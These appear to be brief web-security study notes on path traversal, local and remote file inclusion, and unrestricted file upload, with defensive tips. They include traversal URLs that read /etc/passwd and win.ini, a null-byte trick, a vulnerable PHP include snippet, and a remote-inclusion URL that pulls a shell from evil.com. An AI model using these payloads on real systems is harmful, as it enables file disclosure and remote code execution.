2. File Inclusion Vulnerabilities
3. Unrestricted File Upload
***
1. Path traversal
- This attack, also known as the dot-dot-slash
- `http://www.elsfoo.com/getFile?path=../../../etc/passwd` : Linux --> /
- `http://www.elsfoo.com/getFile?path=../../../windows/win.ini` : Windows ->\ , /
- `http://www.elsfoo.com/getFile?path=../../../windows/boot.ini` : Windows
- terminate the current file name. : `%00`, does not work with PHP versions >= 5.3.4
	- `file_read ("/htdocs/website/reports/" user_input + ".pdf");`
- URL encoding, 16-bit Unicode
- Best defensive Techniques
	- Filter any malicious sequences from the input parameters
***
2. File Inclusion Vulnerabilities
- File inclusion vulnerabilities are divided in Remote and Local
	- LFI : include Function
		```
		<?php
	 include("loc/" . $_GET['location']);
		?>```
	- Remote File Inclusion
		- `vuln.php?page=http://evil.com/shell.txt`
		- In this case, shell.txt (containing PHP code)
		- It is important to know that the file included must not have the .php extension, otherwise the code within the included file will run on the attacker machine
		- RFI is possible because the allow_url_include directive is set to On within php.ini. It is good practice to set it to Off.

3. Unrestricted File Upload
- For the application to be vulnerable :
	- The file type is not checked against a whitelist of allowed formats
	- The file name and path of the uploaded file is known to the attacker or guessable
	- The folder in which the file is placed allows the execution of server-side scripts
	- Best Defense : A web developer should inspect the uploaded file at two different layers:
		- METADATA (name, extension, size, etc.)
		- ACTUAL CONTENT
		- Enforcing a whitelist (or blacklist)
